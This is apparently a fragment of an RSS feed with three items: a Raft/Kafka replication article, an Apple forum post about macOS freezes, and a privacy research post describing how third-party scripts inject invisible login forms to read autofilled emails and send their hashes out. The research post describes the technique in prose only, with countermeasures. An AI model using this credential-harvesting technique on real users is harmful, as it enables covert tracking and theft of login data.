-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/wal.png&quot;&gt;&lt;img class=&quot; wp-image-3169 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/wal.png&quot; alt=&quot;&quot; width=&quot;375&quot; height=&quot;318&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Once the message is committed in Raft, it’s written to the NATS Streaming log and the message is now visible to consumers.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/wal_committed.png&quot;&gt;&lt;img class=&quot; wp-image-3170 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/wal_committed.png&quot; alt=&quot;&quot; width=&quot;375&quot; height=&quot;256&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Note, however, that not only messages are written to the Raft log. We also have subscriptions and cluster topology changes, for instance. These other items are not written to the NATS Streaming log but handled in other ways on commit. That said, messages tend to occur in much greater volume than these other entries.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/dual_writes.png&quot;&gt;&lt;img class=&quot;size-full wp-image-3171 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/dual_writes.png&quot; alt=&quot;&quot; width=&quot;1844&quot; height=&quot;679&quot; srcset=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/dual_writes.png 1844w, https://bravenewgeek.com/wp-content/uploads/2017/12/dual_writes-300x110.png 300w, https://bravenewgeek.com/wp-content/uploads/2017/12/dual_writes-768x283.png 768w, https://bravenewgeek.com/wp-content/uploads/2017/12/dual_writes-1024x377.png 1024w&quot; sizes=&quot;(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Messages end up getting stored redundantly, once in the Raft log and once in the NATS Streaming log. We can address this problem if we think about our logs a bit differently. If you recall from &lt;a href=&quot;https://bravenewgeek.com/building-a-distributed-log-from-scratch-part-1-storage-mechanics/&quot;&gt;part one&lt;/a&gt;, our log storage consists of two parts: the log segment and the log index. The segment stores the actual log data, and the index stores a mapping from log offset to position in the segment.&lt;/p&gt;
-&lt;p&gt;Along these lines, we can think of the Raft log index as a “physical offset” and the NATS Streaming log index as a “logical offset.” Instead of maintaining two logs, we treat the Raft log as our message write-ahead log and treat the NATS Streaming log as an index into that WAL. Particularly, messages are written to the Raft log as usual. Once committed, we write an index entry for the message offset that points back into the log. As before, we use the index to do lookups into the log and can then read sequentially from the log itself.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/raft_index.png&quot;&gt;&lt;img class=&quot;size-full wp-image-3172 aligncenter&quot; src=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/raft_index.png&quot; alt=&quot;&quot; width=&quot;1846&quot; height=&quot;586&quot; srcset=&quot;https://bravenewgeek.com/wp-content/uploads/2017/12/raft_index.png 1846w, https://bravenewgeek.com/wp-content/uploads/2017/12/raft_index-300x95.png 300w, https://bravenewgeek.com/wp-content/uploads/2017/12/raft_index-768x244.png 768w, https://bravenewgeek.com/wp-content/uploads/2017/12/raft_index-1024x325.png 1024w&quot; sizes=&quot;(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h3&gt;Remaining Questions&lt;/h3&gt;
-&lt;p&gt;We’ve answered the questions of how to ensure continuity of reads and writes, how to replicate data, and how to ensure replicas are consistent. The remaining two questions pertaining to replication are how do we keep things fast and how do we ensure data is durable?&lt;/p&gt;
-&lt;p&gt;There are several things we can do with respect to performance. The first is we can configure publisher acks depending on our application’s requirements. Specifically, we have three options. The first is the broker acks on commit. This is slow but safe as it guarantees the data is replicated. The second is the broker acks on appending to its local log. This is fast but unsafe since it doesn’t wait on any replica roundtrips but, by that very fact, means that the data is not replicated. If the leader crashes, the message could be lost. Lastly, the publisher can just not wait for an ack at all. This is the fastest but least safe option for obvious reasons. Tuning this all depends on what requirements and trade-offs make sense for your application.&lt;/p&gt;
-&lt;p&gt;The second thing we do is don’t explicitly &lt;em&gt;fsync&lt;/em&gt; writes on the broker and instead rely on replication for durability. Both Kafka and NATS Streaming (when clustered) do this. With &lt;em&gt;fsync&lt;/em&gt; enabled (in Kafka, this is configured with &lt;em&gt;flush.messages &lt;/em&gt;and/or &lt;em&gt;flush.ms&lt;/em&gt; and in NATS Streaming, with &lt;em&gt;file_sync&lt;/em&gt;), every message that gets published results in a sync to disk. This ends up being very expensive. The thought here is if we are replicating to enough nodes, the replication itself is sufficient for HA of data since the likelihood of more than a quorum of nodes failing is low, especially if we are using rack-aware clustering. Note that data is still periodically flushed in the background by the kernel.&lt;/p&gt;
-&lt;p&gt;Batching aggressively is also a key part of ensuring good performance. Kafka supports end-to-end batching from the producer all the way to the consumer. NATS Streaming does not currently support batching at the API level, but it uses aggressive batching when replicating and persisting messages. In my experience, this makes about an order-of-magnitude improvement in throughput.&lt;/p&gt;
-&lt;p&gt;Finally, as already discussed earlier in the series, keeping disk access sequential and maximizing zero-copy reads makes a big difference as well.&lt;/p&gt;
-&lt;p&gt;There are a few things worth noting with respect to durability. Quorum is what guarantees durability of data. This comes “for free” with Raft due to the nature of that protocol. In Kafka, we need to do a bit of configuring to ensure this. Namely, we need to configure &lt;em&gt;min.insync.replicas&lt;/em&gt; on the broker and &lt;em&gt;acks &lt;/em&gt;on the producer. The former controls the minimum number of replicas that must acknowledge a write for it to be considered successful when a producer sets &lt;em&gt;acks&lt;/em&gt; to “all.” The latter controls the number of acknowledgments the producer requires the leader to have received before considering a request complete. For example, with a topic that has a replication factor of three, &lt;em&gt;min.insync.replicas &lt;/em&gt;needs to be set to two and &lt;em&gt;acks&lt;/em&gt; set to “all.” This will, in effect, require a quorum of two replicas to process writes.&lt;/p&gt;
-&lt;p&gt;Another caveat with Kafka is unclean leader elections. That is, if all replicas become unavailable, there are two options: choose the first replica to come back to life (not necessarily in the ISR) and elect this replica as leader (which could result in data loss) or wait for a replica in the ISR to come back to life and elect it as leader (which could result in prolonged unavailability). By default, Kafka favors availability by choosing the second strategy. If you prefer consistency, you must set &lt;em&gt;unclean.leader.election.enable&lt;/em&gt; to &lt;em&gt;false&lt;/em&gt;.&lt;/p&gt;
-&lt;p&gt;Fundamentally, durability and consistency are at odds with availability. If there is no quorum, then no reads or writes can be accepted and the cluster is unavailable. This is the crux of the &lt;a href=&quot;https://bravenewgeek.com/cap-and-the-illusion-of-choice/&quot;&gt;CAP theorem&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;In part three of this series, we will discuss scaling message delivery in the distributed log.&lt;/p&gt;
-&lt;div class=&quot;sharedaddy sd-sharing-enabled&quot;&gt;
-&lt;div class=&quot;robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing&quot;&gt;
-&lt;h3 class=&quot;sd-title&quot;&gt;Share this:&lt;/h3&gt;
-
-&lt;/div&gt;
-&lt;/div&gt;
-</description>
-<pubDate>Thu, 28 Dec 2017 13:29:33 +0000</pubDate>
-<dc:creator>bhattisatish</dc:creator>
-<og:type>article</og:type>
-<og:title>Building a Distributed Log from Scratch, Part 2: Data Replication</og:title>
-<og:url>https://bravenewgeek.com/building-a-distributed-log-from-scratch-part-2-data-replication/</og:url>
-<og:description>In part one of this series we introduced the idea of a message log, touched on why it’s useful, and discussed the storage mechanics behind it. In part two, we discuss data replication. We hav…</og:description>
-<og:image>https://bravenewgeek.com/wp-content/uploads/2017/12/raft_index.png</og:image>
-<dc:language>en-US</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>https://bravenewgeek.com/building-a-distributed-log-from-scratch-part-2-data-replication/</dc:identifier>
-</item>
-<item>
-<title>High Sierra macOS freezing and stops</title>
-<link>https://discussions.apple.com/thread/8101384</link>
-<guid isPermaLink="true" >https://discussions.apple.com/thread/8101384</guid>
-<description>&lt;p&gt;I started seeing this happen on my 2012 27&quot; iMac shortly after updating to High Sierra.  It seems to be related to having any browser window with video in it (even if paused), or maybe any app that uses QuickTime (I've been using the QuickTime player quite abit, also).  It's been doing this at least once per day, sometimes more often.  It occurs in both the primary user account, and other secondary user accounts.  I've disabled just about every Safari extension, and almost all login items.  Up until the most recent freeze, everything is frozen.  The latest time it happened, however, the mouse pointer was still alive, and I was even able to reconnect the mouse when I cycled power on the mouse.  It would move around the screen, but nothing else would respond. (I tried power cycling the keyboard, but couldn't bring up the force kill window).&lt;/p&gt;
-
-&lt;p&gt;I've looked through all the console logs each time it has frozen (after rebooting), and I can't find any related crash info, or any clues.  It does seem like perhaps its the window server, because there are other log entries after the time of the freeze (before forcing a reboot) which would tend to confirm that at least some processes are still alive and running.  The fact that I could move the mouse pointer the last time it happened (and even reconnect the mouse after power cycling it) tends to confirm that most processes are probably still running.&lt;/p&gt;
-
-&lt;p&gt;I also disconnected most USB peripherals, and a disk drive that I don't generally use.  That hasn't made any difference, so I don't think its related to USB or Firewire.  For good measure, I blew all the dust out of the RAM bay today, just to make sure it wasn't a heat issue.&lt;/p&gt;
-</description>
-<pubDate>Thu, 28 Dec 2017 11:29:01 +0000</pubDate>
-<dc:creator>mhasbini</dc:creator>
-<dc:language>en-US</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>https://discussions.apple.com/thread/8101384</dc:identifier>
-</item>
-<item>
-<title>No boundaries for user identities: Web trackers exploit browser login managers</title>
-<link>https://freedom-to-tinker.com/2017/12/27/no-boundaries-for-user-identities-web-trackers-exploit-browser-login-managers/</link>
-<guid isPermaLink="true" >https://freedom-to-tinker.com/2017/12/27/no-boundaries-for-user-identities-web-trackers-exploit-browser-login-managers/</guid>
-<description>&lt;p&gt;&lt;em&gt;In this second installment of the&lt;/em&gt; &lt;a href=&quot;https://freedom-to-tinker.com/2017/11/15/no-boundaries-exfiltration-of-personal-data-by-session-replay-scripts/&quot;&gt;&lt;em&gt;No Boundaries series&lt;/em&gt;&lt;/a&gt;&lt;em&gt;, we show how a long-known vulnerability in browsers’ built-in password managers is abused by third-party scripts for tracking on more than a thousand sites.&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;by Gunes Acar, Steven Englehardt, and Arvind Narayanan&lt;/p&gt;
-&lt;p&gt;&lt;img class=&quot;alignnone wp-image-13329&quot; src=&quot;https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/26232843/Autofill-blog-post2-300x195.png&quot; alt=&quot;&quot; width=&quot;650&quot; height=&quot;424&quot; srcset=&quot;https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/26232843/Autofill-blog-post2-300x195.png 300w, https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/26232843/Autofill-blog-post2-768x500.png 768w, https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/26232843/Autofill-blog-post2-1024x667.png 1024w, https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/26232843/Autofill-blog-post2-600x391.png 600w&quot; sizes=&quot;(max-width: 650px) 100vw, 650px&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;We show how third-party scripts exploit browsers’ built-in login managers (also called password managers) to retrieve and exfiltrate user identifiers without user awareness. To the best of our knowledge, our research is the first to show that login managers are being abused by third-party scripts for the purposes of web tracking.&lt;/p&gt;
-&lt;p&gt;The underlying vulnerability of login managers to credential theft &lt;a href=&quot;https://web.archive.org/web/20120605184841/http://ha.ckers.org/blog/20060821/stealing-user-information-via-automatic-form-filling/&quot;&gt;has&lt;/a&gt; &lt;a href=&quot;http://homakov.blogspot.com/2012/11/xss-save-your-password-pwned.html&quot;&gt;been&lt;/a&gt; &lt;a href=&quot;https://bugzilla.mozilla.org/show_bug.cgi?id=1107422#c2&quot;&gt;known&lt;/a&gt; &lt;a href=&quot;https://bugzilla.mozilla.org/show_bug.cgi?id=408531&quot;&gt;for&lt;/a&gt; &lt;a href=&quot;https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-silver.pdf&quot;&gt;years&lt;/a&gt;. Much of the past discussion has focused on password exfiltration by malicious scripts through cross-site scripting (XSS) attacks. Fortunately, we haven’t found password theft on the 50,000 sites that we analyzed. Instead, we found tracking scripts embedded by the first party abusing the same technique to extract emails addresses for building tracking identifiers.&lt;/p&gt;
-&lt;p&gt;&lt;span id=&quot;more-13327&quot;&gt;&lt;/span&gt;The image above shows the process. First, a user fills out a login form on the page and asks the browser to save the login. The tracking script is not present on the login page [1]. Then, the user visits another page on the same website which includes the third-party tracking script. The tracking script inserts an invisible login form, which is automatically filled in by the browser’s login manager. The third-party script retrieves the user’s email address by reading the populated form and sends the email hashes to third-party servers.&lt;/p&gt;
-&lt;p&gt;You can test the attack yourself on our live &lt;a href=&quot;https://senglehardt.com/demo/no_boundaries/loginmanager/&quot;&gt;&lt;strong&gt;demo page&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;We found two scripts using this technique to extract email addresses from login managers on the websites which embed them. These addresses are then hashed and sent to one or more third-party servers. These scripts were present on 1110 of the Alexa top 1 million sites. The process of detecting these scripts is described in our measurement methodology in the Appendix 1. We provide a brief analysis of each script in the sections below.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Why does the attack work?&lt;/strong&gt; All major browsers have built-in login managers that save and automatically fill in username and password data to make the login experience more seamless. The set of heuristics used to determine which login forms will be autofilled &lt;a href=&quot;http://www.cs.columbia.edu/~suman/docs/suman_pwdmgr.pdf&quot;&gt;varies by browser&lt;/a&gt;, but the basic requirement is that a &lt;a href=&quot;https://searchfox.org/mozilla-central/source/toolkit/components/passwordmgr/LoginManagerContent.jsm#1069&quot;&gt;username and password field be available&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;Login form autofilling in general doesn’t require user interaction; all of the major browsers will autofill the username (often an email address) immediately, regardless of the visibility of the form. Chrome doesn’t autofill the password field until the user clicks or touches anywhere on the page. Other browsers we tested [2] don’t require user interaction to autofill password fields.&lt;/p&gt;
-&lt;p&gt;Thus, third-party javascript can retrieve the saved credentials by creating a form with the username and password fields, which will then be autofilled by the login manager.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Why collect hashes of email addresses?&lt;/strong&gt; Email addresses are unique and persistent, and thus the hash of an email address is an excellent tracking identifier. A user’s email address will almost never change — clearing cookies, using private browsing mode, or switching devices won’t prevent tracking. The hash of an email address can be used to connect the pieces of an online profile scattered across different browsers, devices, and mobile apps. It can also serve as a link between browsing history profiles before and after cookie clears. In a &lt;a href=&quot;https://freedom-to-tinker.com/2017/09/28/i-never-signed-up-for-this-privacy-implications-of-email-tracking/&quot;&gt;previous blog post on email tracking&lt;/a&gt;, we described in detail why a hashed email address is not an anonymous identifier.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Scripts exploiting browser login managers&lt;br /&gt;&lt;/strong&gt;&lt;a href=&quot;https://webtransparency.cs.princeton.edu/no_boundaries/autofill_sites.html&quot;&gt;&lt;em&gt;List of sites embedding scripts that abuse login manager for tracking&lt;/em&gt;&lt;/a&gt;&lt;br /&gt;“&lt;em&gt;Smart Advertising Performance&lt;/em&gt;” and “&lt;em&gt;Big Data Marketing&lt;/em&gt;” are the taglines used by the two companies who own the scripts that abuse login managers to extract email addresses. We have manually analyzed the scripts that contained the attack code and verified the attack steps described above. The snippets from the two scripts are given in Appendix 2.&lt;/p&gt;
-&lt;div id=&quot;attachment_13334&quot; class=&quot;wp-caption aligncenter&quot;&gt;&lt;img class=&quot;wp-image-13334&quot; src=&quot;https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/26235414/table-300x43.png&quot; alt=&quot;The scripts that use login manager to extract email addresses present on a total of 1110 of the top 1 Million Alexa sites.&quot; width=&quot;500&quot; height=&quot;71&quot; srcset=&quot;https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/26235414/table-300x43.png 300w, https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/26235414/table-768x110.png 768w, https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/26235414/table-600x86.png 600w, https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/26235414/table.png 938w&quot; sizes=&quot;(max-width: 500px) 100vw, 500px&quot; /&gt;&lt;p class=&quot;wp-caption-text&quot;&gt;&lt;em&gt;The scripts that use login manager to extract email addresses present on a total of 1110 of the top 1 Million Alexa sites.&lt;/em&gt;&lt;/p&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Adthink (audienceinsights.net):&lt;/strong&gt; After injecting an invisible form and reading the email address, Adthink script sends MD5, SHA1 and SHA256 hashes of the email address to its server (secure.audienceinsights.net). Adthink then triggers another request containing the MD5 hash of the email to data broker Acxiom (p-eu.acxiom-online.com).&lt;/p&gt;
-&lt;p&gt;The Adthink script contains very detailed categories for personal, financial, physical traits, as well as intents, interests and demographics. It is hard to comment on the exact use of these categories but it gives a glimpse of what our online profiles are made up of:&lt;/p&gt;
-&lt;table&gt;&lt;caption align=&quot;bottom&quot;&gt;The categories mentioned in the Adthink script include detailed personal, financial, physical traits, as well as intents, interests and demographics (&lt;a href=&quot;https://gist.github.com/gunesacar/6de71057fc15074d94cda5c344b06cbb&quot;&gt;Link to the code snippet&lt;/a&gt;).&lt;/caption&gt;
-&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;&lt;em&gt;&lt;small&gt;birth date, age, gender, nationality, height, weight, BMI (body mass index), hair_color (black, brown, blond, auburn, chestnut, red, gray, white), eye_color (amber, blue, brown, grey, green), education, occupation, net_income, raw_income, relationship states, seek_for_gender (m, f, transman, transwoman, couple), pets, location (postcode, town, state, country), loan (type, amount, duration, overindebted), insurance (car, motorbike, home, pet, health, life), card_risk (chargeback, fraud_attempt), has_car(make, model, type, registration, model year, fuel type), tobacco, alcohol, travel (from, to, departure, return), car_hire_driver_age, hotel_stars&lt;/small&gt;&lt;/em&gt;&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
-&lt;p&gt;&lt;strong&gt;OnAudience (behavioralengine.com):&lt;/strong&gt; The OnAudience script is most commonly present on Polish websites, including newspapers, ISPs and online retailers. 45 of the 63 sites that contain OnAudience script have “.pl” country code top-level domain.&lt;/p&gt;
-&lt;p&gt;The script sends the MD5 hash of the email back to its server after reading it through the login manager. OnAudience script also collects browser features including plugins, MIME types, screen dimensions, language, timezone information, user agent string, OS and CPU information. The script then generates a hash based on this browser fingerprint. OnAudience &lt;a href=&quot;http://www.onaudience.com/index.php?action=dataexchange&quot;&gt;claims to use anonymous data only&lt;/a&gt;, but hashed email addresses are not anonymous. If an attacker wants to determine whether a user is in the dataset, they can simply hash the user’s email address and search for records associated with that hash. For a more detailed discussion, see our &lt;a href=&quot;https://freedom-to-tinker.com/2017/09/28/i-never-signed-up-for-this-privacy-implications-of-email-tracking/&quot;&gt;previous blog post&lt;/a&gt;.&lt;/p&gt;
-&lt;div id=&quot;attachment_13337&quot; class=&quot;wp-caption alignnone&quot;&gt;&lt;img class=&quot;wp-image-13337&quot; src=&quot;https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/27000025/buyprofiles1-300x183.png&quot; alt=&quot;OnAudience marketing material that advertises &amp;quot;billions of user profiles&amp;quot;.&quot; width=&quot;650&quot; height=&quot;396&quot; srcset=&quot;https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/27000025/buyprofiles1-300x183.png 300w, https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/27000025/buyprofiles1-768x467.png 768w, https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/27000025/buyprofiles1-600x365.png 600w, https://s3.amazonaws.com/ftt-uploads/wp-content/uploads/2017/12/27000025/buyprofiles1.png 953w&quot; sizes=&quot;(max-width: 650px) 100vw, 650px&quot; /&gt;&lt;p class=&quot;wp-caption-text&quot;&gt;OnAudience marketing material that advertises “billions of user profiles”.&lt;/p&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Is this attack new?&lt;/strong&gt; This and similar attacks have been discussed in a number of &lt;a href=&quot;https://bugzilla.mozilla.org/show_bug.cgi?id=408531&quot;&gt;browser&lt;/a&gt; &lt;a href=&quot;https://bugzilla.mozilla.org/show_bug.cgi?id=360493&quot;&gt;bug reports&lt;/a&gt; and &lt;a href=&quot;http://crypto.stanford.edu/~dabo/pubs/papers/pwdmgrBrowser.pdf&quot;&gt;academic&lt;/a&gt; &lt;a href=&quot;https://www.ben-stock.de/wp-content/uploads/asiacss2014.pdf&quot;&gt;papers&lt;/a&gt; for at &lt;a href=&quot;https://bugzilla.mozilla.org/show_bug.cgi?id=359675&quot;&gt;least 11 years&lt;/a&gt;. Much of the previous discussion focuses on the security implications of the current functionality, and on the security-usability tradeoff of the autofill functionality.&lt;/p&gt;
-&lt;p&gt;Several researchers showed that it is possible to steal passwords from login managers through cross-site scripting (XSS) attacks [3,4,5,6,7]. Login managers and XSS is a dangerous mixture for two reasons: 1) passwords retrieved by XSS can have more devastating effects compared to cookie theft, as users &lt;a href=&quot;http://www.jbonneau.com/doc/DBCBW14-NDSS-tangled_web.pdf&quot;&gt;commonly reuse passwords across different sites&lt;/a&gt;; 2) login managers extend the attack surface for the password theft, as an XSS attack can steal passwords on any page within a site, even those which don’t contain a login form.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;How did we get here?&lt;/strong&gt; You may wonder how a security vulnerability persisted for 11 years. That’s because from a narrow browser security perspective, there is no vulnerability, and everything is working as intended. Let us explain.&lt;/p&gt;
-&lt;p&gt;The web’s security rests on the Same Origin Policy. In this model, scripts and content from different origins (roughly, domains or websites) are treated as mutually untrusting, and the browser protects them from interfering with each other. However, if a publisher directly embeds a third-party script, rather than isolating it in an iframe, the script is treated as coming from the publisher’s origin. Thus, the publisher (and its users) entirely lose the protections of the same origin policy, and there is nothing preventing the script from exfiltrating sensitive information. Sadly, direct embedding is common — and, in fact, the default — which also explains why the vulnerabilities we exposed in our &lt;a href=&quot;https://freedom-to-tinker.com/2017/11/15/no-boundaries-exfiltration-of-personal-data-by-session-replay-scripts/&quot;&gt;previous post&lt;/a&gt; were possible.&lt;/p&gt;
-&lt;p&gt;This model is a poor fit for reality. Publishers neither completely trust nor completely mistrust third parties, and thus neither of the two options (iframe sandboxing and direct embedding) is a good fit: one limits functionality and the other is a privacy nightmare. We’ve found repeatedly through our research that third parties are quite opaque about the behavior of their scripts, and at any rate, most publishers don’t have the time or technical knowhow to evaluate them. Thus, we’re stuck with this uneasy relationship between publishers and third parties for the foreseeable future.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;The browser vendor’s dilemma.&lt;/strong&gt; It is clear that the Same-Origin Policy is a poor fit for trust relationships on the web today, and that other security defenses would help. But there is another dilemma for browser vendors: should they defend against this and other similar vulnerabilities, or view it as the publisher’s fault for embedding the third party at all?&lt;/p&gt;
-&lt;p&gt;There are good arguments for both views. Currently browser vendors seem to adopt the latter for the login manager issue, viewing it as the publisher’s burden. In general, there is no principled way to defend against third parties that are present on some pages on a site from accessing sensitive data on other pages of the same site. For example, if a user simultaneously has two tabs from the same site open — one containing a login form but no third party, and vice versa — then the third-party script can “reach across” browser tabs and exfiltrate the login information &lt;a href=&quot;https://medium.com/@bluepnume/every-known-way-to-get-references-to-windows-in-javascript-223778bede2d&quot;&gt;under certain circumstances&lt;/a&gt;. By embedding a third party &lt;em&gt;anywhere&lt;/em&gt; on its site, the publisher signals that it completely trusts the third party.&lt;/p&gt;
-&lt;p&gt;Yet, in other cases, browser vendors have chosen to adopt defenses even if necessarily imperfect. For example, the HTTPOnly cookie attribute was introduced to limit the impact of XSS attacks by blocking the script access to security critical cookies.&lt;/p&gt;
-&lt;p&gt;There is another relevant factor: our discovery means that autofill is not just a security vulnerability but also a privacy threat. While the security community strongly prefers principled solutions whenever possible, when it comes to web tracking, we have generally been willing to embrace more heuristic defenses such as blocklists.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Countermeasures.&lt;/strong&gt; Publishers, users, and browser vendors can all take steps to prevent autofill data exfiltration. We discuss each in turn.&lt;/p&gt;
-&lt;p&gt;Publishers can isolate login forms by putting them on a separate subdomain, which prevents autofill from working on non-login pages. This does have drawbacks including an increase in engineering complexity. Alternately they could isolate third parties using frameworks like &lt;a href=&quot;https://www.iab.com/guidelines/safeframe/&quot;&gt;Safeframe&lt;/a&gt;. Safeframe makes it easier for the publisher scripts and iframed scripts to communicate, thus blunting the effect of sandboxing. Any such technique requires additional engineering by the publisher compared to simply dropping a third-party script into the web page.&lt;/p&gt;
-&lt;p&gt;Users can install ad blockers or tracking protection extensions to prevent tracking by invasive third-party scripts. The domains used to serve the two scripts (behavioralengine.com and audienceinsights.net) are blocked by the EasyPrivacy blocklist.&lt;/p&gt;
-&lt;p&gt;Now we turn to browsers. The simplest defense is to allow users to disable login autofill. For instance, the Firefox preference &lt;code&gt;signon.autofillForms&lt;/code&gt; can be set to false to disable autofilling of credentials.&lt;/p&gt;
-&lt;p&gt;A less crude defense is to require user interaction before autofilling login forms. Browser vendors have been reluctant to do this because of the usability overhead, but given the evidence of autofill abuse in the wild, this overhead might be justifiable.&lt;/p&gt;
-&lt;p&gt;The upcoming &lt;a href=&quot;https://w3c.github.io/webappsec-credential-management/&quot;&gt;W3C Credential Management API&lt;/a&gt; requires browsers to display a notification when user credentials are provided to a page [8]. Browsers may display the same notification when login information is autofilled by the built-in login managers. Displays of this type won’t directly prevent abuse, but they make attacks more visible to publishers and privacy-conscious users.&lt;/p&gt;
-&lt;p&gt;Finally, the “&lt;a href=&quot;https://mikewest.github.io/credentialmanagement/writeonly&quot;&gt;writeonly form fields&lt;/a&gt;” idea can be a promising direction to secure login forms in general. The &lt;a href=&quot;https://lists.w3.org/Archives/Public/public-webapps/2014JulSep/0165.html&quot;&gt;briefly discussed proposal&lt;/a&gt; defines ways to deny read access to form elements and suggests the use of &lt;a href=&quot;https://mikewest.github.io/credentialmanagement/writeonly/#security-sandboxing&quot;&gt;placeholder nonces to protect autofilled credentials&lt;/a&gt; [9].&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Built-in login managers have a positive effect on web security: they curtail password reuse by making it easy to use complex passwords, and they make phishing attacks are harder to mount. Yet, browser vendors should reconsider allowing stealthy access to autofilled login forms in the light of our findings. More generally, for every browser feature, browser developers and standard bodies should consider how it might be abused by untrustworthy third-party scripts.&lt;/p&gt;
-&lt;hr /&gt;&lt;p&gt;&lt;strong&gt;End notes:&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;[1] We found that login pages contain 25% fewer third-parties compared to pages without login forms. The analysis was based on our crawl of 300,000 pages from 50,000 sites.&lt;br /&gt;[2] We tested the following browsers: Firefox, Chrome, Internet Explorer, Edge, Safari.&lt;br /&gt;[3] &lt;a href=&quot;https://labs.neohapsis.com/2012/04/25/abusing-password-managers-with-xss/&quot;&gt;https://labs.neohapsis.com/2012/04/25/abusing-password-managers-with-xss/&lt;/a&gt;&lt;br /&gt;[4] &lt;a href=&quot;https://www.honoki.net/2014/05/grab-password-with-xss/&quot;&gt;https://www.honoki.net/2014/05/grab-password-with-xss/&lt;/a&gt;&lt;br /&gt;[5] &lt;a href=&quot;https://web.archive.org/web/20150131032001/http://ha.ckers.org:80/blog/20060821/stealing-user-information-via-automatic-form-filling/&quot;&gt;https://web.archive.org/web/20150131032001/http://ha.ckers.org:80/blog/20060821/stealing-user-information-via-automatic-form-filling/&lt;/a&gt;&lt;br /&gt;[6] &lt;a href=&quot;http://www.martani.net/2009/08/xss-steal-passwords-using-javascript.html&quot;&gt;http://www.martani.net/2009/08/xss-steal-passwords-using-javascript.html&lt;/a&gt;&lt;br /&gt;[7] &lt;a href=&quot;https://ancat.github.io/xss/2017/01/08/stealing-plaintext-passwords.html&quot;&gt;https://ancat.github.io/xss/2017/01/08/stealing-plaintext-passwords.html&lt;/a&gt;&lt;br /&gt;[8] “User agents MUST notify users when credentials are provided to an origin. This could take the form of an icon in the address bar, or some similar location.” &lt;a href=&quot;https://w3c.github.io/webappsec-credential-management/#user-mediation-requirement&quot;&gt;https://w3c.github.io/webappsec-credential-management/#user-mediation-requirement&lt;/a&gt;&lt;br /&gt;[9] Originally proposed in &lt;a href=&quot;https://www.ben-stock.de/wp-content/uploads/asiacss2014.pdf&quot;&gt;https://www.ben-stock.de/wp-content/uploads/asiacss2014.pdf&lt;/a&gt;&lt;br /&gt;[10] &lt;a href=&quot;https://jacob.hoffman-andrews.com/README/2017/01/15/how-not-to-get-phished.html&quot;&gt;https://jacob.hoffman-andrews.com/README/2017/01/15/how-not-to-get-phished.html&lt;/a&gt;&lt;/p&gt;
-&lt;hr /&gt;&lt;p&gt;&lt;strong&gt;APPENDICES&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Appendix 1 – Methodology&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;To study password manager abuse, we extended OpenWPM to simulate a user with saved login credentials and added instrumentation to monitor form access. We used Firefox’s &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Mozilla/Tech/XPCOM/Reference/Interface/nsILoginManager&quot;&gt;nsILoginManager&lt;/a&gt; interface to add login credentials as if they were previously stored by the user. We did not otherwise alter the functionality of the password manager or attempt to manually fill login forms. This allowed us to capture actual abuses of the browser login manager, as any exfiltrated data must have originated from the login manager.&lt;/p&gt;
